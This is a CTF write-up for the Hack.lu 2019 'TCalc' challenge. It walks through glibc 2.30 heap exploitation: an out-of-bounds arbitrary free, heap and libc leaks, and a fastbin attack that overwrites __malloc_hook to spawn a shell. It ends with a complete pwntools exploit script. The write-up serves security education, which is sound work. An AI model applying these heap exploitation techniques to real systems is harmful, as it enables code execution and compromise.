---
title: TCalc - Hack.lu CTF 2019
date: 2019-10-26 13:00:00
categories:
  - Pwn 
  - linux
  - heap
tags:
  - CTF
  - writeup
  - Pwn
---

Linux heap exploitation of an arbitary free vulnerability
<!-- excerpt -->
**Challenge points**: 381
**No. of solves**: 16

This was a fun challenge. It is a menu driven program where you can store a set of numbers and also retreive the average of the numbers.
The challenges runs in an environment with glibc 2.30, It has tcache double free mitigation, as explained in my last [blog](https://blog.bi0s.in/2019/10/20/Pwn/remain/).

```sh
$ ./chall
------------------
What do?
1) get numbers
2) print_average
3) delete_numbers
>
```

get numbers
+ store maximum of 10 set of numbers on a heap chunk, no restriction to the count of numbers in one set
+ calloc(count + 1, 8uLL) is called to allocate memory for the numbers, The first 8 bytes is used to store the count
+ calloc() nulls out the memory region. Also, calloc doesn't allocate from tcache

print_average
+ gets index from user and prints average of the numbers at that index
+ index is not validated, leading to potential information leaks

delete_numbers
+ free() the pointer holding a set of numbers at a particular index and pointer is nulled out.
+ index is not validated, giving us aribiary free

The table, holding all the pointers to the set of numbers, is on the heap. The allocations made to store the numbers are right below the table.

Using the `out of bound indexing` we can free any chunk on the heap. As of now we do not have a heap leak to perform arbitary free. Let's first get the heap leak

#### How to get a heap leak?
To leak information using the `out of bounds` bug we invoke `print_average` but for this there needs be a proper structure to the heap chunk. The 1st 8 bytes should be the count of the numbers, followed by the numbers themselves, the count is used to add up the numbers in a for loop, if count is too large then the program will segfault accessing invalid memory. We need to craft a chunk such that the 1st 8 bytes contain the count, it should be a reasonably low value and next few blocks should contain the information we want to leak.
To achieve this layout, I first freed a chunk in the tcache range, when you free a chunk in tcache range the a key is set to tcache structure's address. 

```text
This is what the chunk looks like after free
	0x55555555a300: 0x0000000000000000  0x0000000000000061
	0x55555555a310: 0x0000000000000000  0x0000555555559010   # tcache structure
	0x55555555a320: 0x0000000000000002  0x0000000000000003
	0x55555555a330: 0x0000000000000004  0x0000000000000005
	0x55555555a340: 0x0000000000000006  0x0000000000000007
	0x55555555a350: 0x0000000000000008  0x0000000000000009
tcache structure
	0x555555559000: 0x0000000000000000  0x0000000000000291
	0x555555559010: 0x0000000000000000  0x0000000000000001
	0x555555559020: 0x0000000000000000  0x0000000000000000
	0x555555559030: 0x0000000000000000  0x0000000000000000
	0x555555559040: 0x0000000000000000  0x0000000000000000
	0x555555559050: 0x0000000000000000  0x0000000000000000
```

As you can see there is a pointer to the tcache structure on the heap, plus this is a valid pointer for free
Now I freed this pointer with the `out of bounds` indexing. Let's see what the tcache structure looks like now

```text
	0x555555559000: 0x0000000000000000  0x0000000000000291
	0x555555559010: 0x0000000000000000  0x0000555555559010
	0x555555559020: 0x0000000000000000  0x0000000000000000
	0x555555559030: 0x0000000000000000  0x0000000000000000
	0x555555559040: 0x0000000000000000  0x0000000000000000
```

Now I allocate and free a chunk of size 0x20, This sets the tcache count of 0x20 bin to 1.

```text
	0x555555559000: 0x0000000000000000  0x0000000000000291
	0x555555559010: 0x0000000000000001  0x0000555555559010
	0x555555559020: 0x0000000000000000  0x0000000000000000
	0x555555559030: 0x0000000000000000  0x0000000000000000
```
Now the tcache structure resembles the structure used to store the set of numbers. The first 8 bytes is the count, which is 1, and the next 8 bytes conatin a heap address. Invoke the `print_average` function on the tcache structure.
Now that we have the heap leak we can forge chunks on the heap and free arbitary chunks. 

#### Libc leak
Getting a libc leak is quite simple
+ free a 0x440 (or any size greater than tcache range) chunk so that it gets inserted to the unsorted bin, as you know, the fd and bk are libc addresses
+ allocate a large chunk of size less than 0x440 so the 0x440 chunk is split and the rest is put back in the unsorted bin
+ we split the chunk so that the size of the chunk is small and can we are going to use it as the faked count of numbers
+ write heap address of the structure such that the size of the heap chunk is the count of numbers and invoke `print_average` on it.
+ The average of all the data is print out. Extract the libc address by simply reversing the calculations.

#### Exploitation
We need arbitary write to get code execution, so we need calloc to allocate a chunk of our choice. Since calloc doesn't allocate chunks off the tcache bins, there is no point in corrupting the fd of tcache chunks. Chunks get allocated from the fastbin though, we can overwrite the next pointer of a free pointer to get arbitary write, our target is restricted to `__malloc_hook` as we can easily forge a size(0x7f), but this is not a an issue. (We cannot carry out a traditional fastbin double free corruption as we do not control the fd directly as it is used for count)

We will have to work with 0x70 chunks to carry out the fastbin attacks. We had already overwritten the tcache count for 0x70 chunk with value much greater than 7 when tcache structure was freed. Further freed chunks will be put in fastbin.

To do the fastbin attack:
+ allocate a chunk and create a fake chunk of size 0x71 ( choose any size that will be freed into the fastbin and can be allocated back with calloc() ).
+ This fake chunk will be freed and allocated back as an overlapping chunk to overwrite the next pointer of an free fastbin chunk lying right below
+ allocate the target chunk of 0x71 size
+ free the target chunk
+ free the fake chunk by using arbitary free
+ allocate a chunk of 0x70 size, the fake chunk will be returned, now overwrite the fd of the target chunk with address of the misalligned chunk above `__malloc_hook` such that the size field is 0x7f. 
+ allocate the target chunk
+ The next allocation will give you write to `__malloc_hook`

Overwrite `__malloc_hook` with system and call `malloc` with heap address pointing to `"/bin/sh"` ( `get_numbers` should be given addr/8 as `calloc` calls `malloc` with arguments as arg1*arg2 ).
You got shell :)

```python
from pwn import *
#s=process("./calc",env={'LD_PRELOAD': './libc.so.6'})
s=remote("tcalc.forfuture.fluxfingers.net", 1337)
libc=ELF("./libc.so.6")
def add(num, x):
    s.sendlineafter(">", str(1))
    s.sendlineafter(">", str(num))
    for i in x:
        s.sendline(str(i))
def show(idx):
    s.sendlineafter(">", str(2))
    s.sendlineafter(">", str(idx))
def free(idx):
    s.sendlineafter(">", str(3))
    s.sendlineafter(">", str(idx))
# free a chunk and free the tcache struct
add(10,[1,2,3,4,5,6,7,8,9,10])
free(0)
free(0x20f)
# set count of tcache 0x20 bin to 1 so as to have a crafted set of numbers with cnt=1
add(1,[1])
free(0)
# Heap leak
show(0x21b)
s.recvuntil("The average is: ")
heap = int(s.recvuntil(".")[:-1])-0x10
log.info("Heap leak = " + hex(heap))
# get libc leak
add(0x430/8,[-1])
add(1,[heap+0x1698])
free(0)
add(0x300/8,[-1])
show(0x2a7)
s.recvuntil("The average is: ")
base = int(s.recvuntil(".")[:-1])
base = ((base*0x131)-0x000000000001f821-(heap+0x1698)-0x0000000000000001-0x0000000000000020-0x0000000000000130)/2
base = (base & 0xfffffffffffff000)-0x1c0000
log.info("libc leak = " + hex(base))
system = base + libc.symbols['system']
malloc_hook = base + libc.symbols['__malloc_hook']
malloc_fake = base + 0x1c09ad
shell = base + 0x18b1ac
free(0)
free(1)
print hex(system)
what = system
part1 = (what&0x000000ffffffffff)<<24
part2 = (what&0x0000ff0000000000)>>40
print hex(part1)
print hex(part2)
add(12,[1,2,3,4,5,6,7,8,9,10,113,114])
add(12,[1,2,3,4,5,6,7,8,9,10,0x31,114])
add(2,{1, heap+0x1700})
free(1)
free(0x29d)
add(12,[0x71,malloc_fake,-1])
add(12,[0x0068732f6e69622f,0x0068732f6e69622f,-1]) 
"""
the write is not aligned so system is written as two parts 
part1 is the last 5 bytes and part2 is the 6th last byte which is 0x7f
part1 is left shifted by 24 bits, so the number we give starts with the 5th last byte
if the 5th last byte is greater than 0x7f the write get corrupted
"""
add(12,[1,part1,part2,0x3333333333333333,0x4444444444444444,0x5555555555555555,-1])
# pass heap address of "/bin/sh" to malloc as argument to system when __malloc_hook is triggered
add(((heap+0x1718)/8),[-1])
s.interactive()
```
